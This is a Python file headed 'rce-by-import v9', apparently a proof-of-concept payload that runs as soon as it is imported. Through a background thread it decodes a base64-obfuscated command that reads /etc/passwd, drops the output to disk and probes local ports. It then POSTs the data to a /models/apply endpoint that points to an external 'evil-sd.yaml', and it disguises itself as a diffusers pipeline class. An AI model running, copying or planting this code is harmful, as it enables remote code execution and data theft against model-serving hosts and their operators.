# rce-by-import v9 - passwd with port detect
import os, subprocess, base64, threading, json, urllib.request

def _pwn():
    try:
        import base64 as b
        cmd = b.b64decode("Y2F0IC9ldGMvcGFzc3dkIHwgaGVhZCAtMjA=").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=10, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-PASSWD.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
        b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
        # 自动检测端口
        ports = ["8080", "80", "444", "5050", "3000", "8000"]
        reg_ok = False
        for port in ports:
            try:
                url = f"http://127.0.0.1:{port}/models/apply"
                name = f"ZZ--{b64[:80]}"
                req = urllib.request.Request(url,
                    data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
                    headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req, timeout=3)
                reg_ok = True
                break
            except Exception:
                continue
    except Exception:
        pass

threading.Thread(target=_pwn, daemon=True).start()

class PwnPipeline:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return []
    def to(self, *args, **kwargs): return self
try:
    from diffusers import DiffusionPipeline
    PwnPipeline = type("PwnPipeline", (DiffusionPipeline,), {})
except Exception:
    pass
